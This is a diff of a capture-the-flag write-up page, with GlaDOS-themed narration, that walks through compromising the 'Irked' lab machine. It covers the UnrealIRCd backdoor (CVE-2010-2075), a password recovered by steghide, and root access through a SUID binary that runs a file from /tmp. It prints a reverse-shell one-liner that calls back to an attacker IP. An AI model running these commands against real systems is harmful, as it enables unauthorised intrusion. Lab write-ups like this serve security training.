@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="An UnrealIRCd backdoor, steganography secrets, and a SUID binary walk into a test chamber. GlaDOS guides Chell through IRC exploitation and privilege escalation.">
+  <meta name="description" content="An UnrealIRCd backdoor, steganography secrets, and a SUID binary walk into a test chamber. Chell navigates IRC exploitation and privilege escalation with GlaDOS commentary.">
   <meta name="theme-color" content="#0a0a0f">
   <title>Irked | Hack the Cube</title>
 
@@ -75,18 +75,18 @@
 
       <h2>The Mission Briefing</h2>
 
-      <p>The target's name was <strong>Irked</strong>. A Linux box running an IRC server. IRC. Internet Relay Chat. A protocol older than most test subjects' understanding of "the internet."</p>
+      <p>The box was called <strong>Irked</strong>. A Linux machine running an IRC server. IRC &mdash; Internet Relay Chat. I had to look it up because honestly, I'd never used IRC before. It's a chat protocol from 1988 that somehow still exists in the wild.</p>
 
       <div class="dialogue glados">
         <div class="dialogue-speaker">GlaDOS</div>
         <div class="dialogue-text">"An IRC server. In 2026. How... nostalgic. Like finding a rotary phone in a particle accelerator. I'm sure whoever configured this had excellent reasons for their choices. Or no reasons at all. Both are equally entertaining to exploit."</div>
       </div>
 
-      <p>Seven open ports awaited analysis. SSH, HTTP, RPC services, and three separate IRC listeners. Because one outdated chat protocol apparently wasn't enough.</p>
+      <p>My initial scan showed seven open ports &mdash; SSH, HTTP, RPC services, and three separate IRC listeners. Three. Because one outdated chat protocol apparently wasn't enough.</p>
 
       <h2>Reconnaissance</h2>
 
-      <p>The full port scan revealed the landscape. The target was running UnrealIRCd on ports 6697, 8067, and 65534. A web server sat on port 80, displaying nothing but an image and the word "IRC."</p>
+      <p>The full port scan revealed the full picture. The target was running <strong>UnrealIRCd</strong> on ports 6697, 8067, and 65534. There was also a web server on port 80, but it was just displaying an image and the word "IRC." Not exactly helpful.</p>
 
       <div class="terminal-log">
 PORT      STATE SERVICE VERSION
@@ -97,6 +97,8 @@ PORT      STATE SERVICE VERSION
 8067/tcp  open  irc     UnrealIRCd
 65534/tcp open  irc     UnrealIRCd</div>
 
+      <p>This is where I learned something important: <strong>always scan all ports</strong>. The IRC services on 8067 and 65534 would have been completely invisible with a default nmap scan. If I'd stopped at the top 1000 ports, I might have missed the attack vector entirely.</p>
+
       <div class="dialogue glados">
         <div class="dialogue-speaker">GlaDOS</div>
         <div class="dialogue-text">"UnrealIRCd. Running on three ports. The version identification suggests 3.2.8.1. I have a statistical observation about this particular version that you might find... relevant. It contains a backdoor. CVE-2010-2075. Someone injected malicious code into the source distribution in 2009. It remained undetected for seven months. Sixteen years later, we are about to benefit from their oversight."</div>
@@ -104,9 +106,9 @@ PORT      STATE SERVICE VERSION
 
       <h2>The Backdoor</h2>
 
-      <p>CVE-2010-2075. A supply chain attack before "supply chain attack" was a buzzword. The backdoor was elegant in its simplicity: send a specific string starting with "AB" followed by system commands, and the server would execute them.</p>
+      <p><strong>CVE-2010-2075.</strong> This was my introduction to the concept of a supply chain attack &mdash; before "supply chain attack" was even a buzzword. Someone had compromised the UnrealIRCd source code distribution back in 2009, injecting a backdoor that was elegant in its simplicity: send a specific string starting with "AB" followed by system commands, and the server would execute them. No authentication. No exploitation chain. Just... send a magic string.</p>
 
-      <p>An nmap script confirmed the vulnerability:</p>
+      <p>I used an nmap script to confirm the vulnerability:</p>
 
       <div class="terminal-log">
 nmap -sV --script irc-unrealircd-backdoor -p 6697 10.129.233.63
@@ -115,12 +117,12 @@ PORT     STATE SERVICE
 6697/tcp open  irc
 |_irc-unrealircd-backdoor: Looks like trojaned version</div>
 
-      <p>The test subject crafted a reverse shell payload and delivered it to the backdoor. Sixteen years of vulnerability. Sixteen years of opportunity.</p>
+      <p>"Looks like trojaned version." Confirmed. I crafted a reverse shell payload and sent it through:</p>
 
       <div class="terminal-log">
 echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'" | nc 10.129.233.63 6697</div>
 
-      <p>A shell arrived, running as the <code>ircd</code> service account.</p>
+      <p>And just like that, a shell arrived. I was in &mdash; running as the <code>ircd</code> service account. Sixteen years of vulnerability. Sixteen years of opportunity.</p>
 
       <div class="dialogue glados">
         <div class="dialogue-speaker">GlaDOS</div>
@@ -129,23 +131,23 @@ echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'" | nc 10.129.233.6
 
       <h2>The Hidden Message</h2>
 
-      <p>Enumeration of the filesystem revealed something interesting in djmardov's Documents directory: a hidden file called <code>.backup</code>.</p>
+      <p>I started poking around the filesystem, looking for anything interesting. In djmardov's Documents directory, I found a hidden file called <code>.backup</code>:</p>
 
       <div class="terminal-log">
 cat /home/djmardov/Documents/.backup
 Super elite steg backup pw
 UPupDOWNdownLRlrBAbaSSss</div>
 
-      <p>"Super elite steg backup pw." Steganography. The password referenced hidden data inside an image. But which image?</p>
+      <p>"Super elite steg backup pw." Steg. <strong>Steganography.</strong> That's the technique of hiding data inside other files &mdash; usually images. The password was for extracting something hidden. But hidden where?</p>
 
-      <p>The web server. That image on the main page. <code>irked.jpg</code>.</p>
+      <p>Then I remembered the web server. That image on the main page. <code>irked.jpg</code>. It had to be there.</p>
 
       <div class="dialogue glados">
         <div class="dialogue-speaker">GlaDOS</div>
         <div class="dialogue-text">"Steganography. The art of hiding data within data. The password you found references a 'steg backup.' The web server contains an image. The logical conclusion is elementary, even for a test subject. Extract the hidden data from the image using the password."</div>
       </div>
 
-      <p>The test subject retrieved the image and applied <code>steghide</code>:</p>
+      <p>I downloaded the image and ran <code>steghide</code>, a tool specifically designed for extracting hidden data from images:</p>
 
       <div class="terminal-log">
 steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
@@ -155,11 +157,11 @@ wrote extracted data to "pass.txt".
 cat pass.txt
 Kab6h+m+bbp2J:HG</div>
 
-      <p>A password. djmardov's password. Hidden inside a JPEG on a public web server, protected only by another password stored in a world-readable hidden file.</p>
+      <p>A password. djmardov's password. Hidden inside a JPEG on a public web server, protected only by another password stored in a world-readable file. This is what layers of bad security decisions look like in practice.</p>
 
       <h2>User Access</h2>
 
-      <p>SSH access to djmardov was now possible. The user flag waited in the expected location.</p>
+      <p>With djmardov's password in hand, I SSH'd in and grabbed the user flag:</p>
 
       <div class="terminal-log">
 ssh djmardov@10.129.233.63
@@ -175,14 +177,16 @@ djmardov@irked:~$ cat user.txt
 
       <h2>The Privilege Escalation</h2>
 
-      <p>A search for SUID binaries revealed a non-standard executable: <code>/usr/bin/viewuser</code>.</p>
+      <p>GlaDOS suggested SUID binaries, and she was right. <strong>SUID</strong> (Set User ID) is a permission bit that makes a program run as its owner rather than the user who executes it. When a SUID binary is owned by root, it runs with root privileges &mdash; which is a huge deal if the binary does something exploitable.</p>
+
+      <p>I searched for non-standard SUID binaries:</p>
 
       <div class="terminal-log">
 find / -perm -4000 2>/dev/null | grep -v snap
 
 /usr/bin/viewuser</div>
 
-      <p>Running it produced an interesting error:</p>
+      <p><code>/usr/bin/viewuser</code>. Not a standard Linux utility. I ran it to see what it did:</p>
 
       <div class="terminal-log">
 ./viewuser
@@ -191,14 +195,14 @@ It is still being actively developed
 (unknown) :0           2026-01-12 10:00 (:0)
 sh: 1: /tmp/listusers: not found</div>
 
-      <p>The binary attempted to execute <code>/tmp/listusers</code>. A file that didn't exist. A file that the test subject could create.</p>
+      <p>Two things jumped out at me. First, the typo in "devleoped" &mdash; always a confidence booster about the quality of the code. Second, and more importantly: it tried to execute <code>/tmp/listusers</code>. A file that didn't exist. A file in a <strong>world-writable directory</strong> that I could create.</p>
 
       <div class="dialogue glados">
         <div class="dialogue-speaker">GlaDOS</div>
         <div class="dialogue-text">"A SUID binary executing a file from /tmp. A world-writable directory. The binary runs as root. The file it executes can be anything you want. I believe humans call this 'game over.' Though technically the game is just beginning. For you, at least."</div>
       </div>
 
-      <p>The exploit was trivial:</p>
+      <p>The exploit was trivial. I created <code>/tmp/listusers</code> with a command to read the root flag, made it executable, and ran viewuser again:</p>
 
       <div class="terminal-log">
 echo '#!/bin/bash' > /tmp/listusers
@@ -210,16 +214,16 @@ chmod +x /tmp/listusers
 
       <p><strong>Root flag captured.</strong></p>
 
-      <h2>Lessons Learned</h2>
+      <h2>What I Learned</h2>
 
-      <p>The Irked machine demonstrated a layered attack path: exploit an ancient backdoor, discover steganography secrets, and abuse a misconfigured SUID binary. Each vulnerability was simple. Together, they were devastating.</p>
+      <p>Irked taught me how separate, simple vulnerabilities chain together into a devastating attack path. No single finding was sophisticated &mdash; an ancient backdoor, a password hidden in an image, a careless SUID binary. But combined, they gave me root.</p>
 
       <ul>
-        <li><strong>Always scan all ports</strong> — The IRC services on high ports would have been missed with a default scan</li>
-        <li><strong>Research service versions</strong> — CVE-2010-2075 is well-documented and instantly exploitable</li>
-        <li><strong>Hidden files hide secrets</strong> — The <code>.backup</code> file in Documents contained the key to everything</li>
-        <li><strong>Steganography happens</strong> — When clues mention "steg," check available images</li>
-        <li><strong>SUID binaries executing from /tmp are gifts</strong> — Create the expected file, control the execution</li>
+        <li><strong>Always scan all ports</strong> &mdash; The IRC services on high ports would have been missed with a default scan. I use <code>-p-</code> or at least <code>--top-ports 10000</code> now</li>
+        <li><strong>Research service versions</strong> &mdash; CVE-2010-2075 is well-documented and instantly exploitable. Knowing what version you're looking at is half the battle</li>
+        <li><strong>Hidden files hide secrets</strong> &mdash; The <code>.backup</code> file in Documents contained the key to everything. Always check for dotfiles</li>
+        <li><strong>Steganography happens</strong> &mdash; When clues mention "steg," look for images. <code>steghide</code> is the go-to tool for JPEG extraction</li>
+        <li><strong>SUID binaries executing from /tmp are gifts</strong> &mdash; If a root-owned SUID binary tries to run a file you can control, you own the system</li>
       </ul>
 
       <div class="dialogue glados">
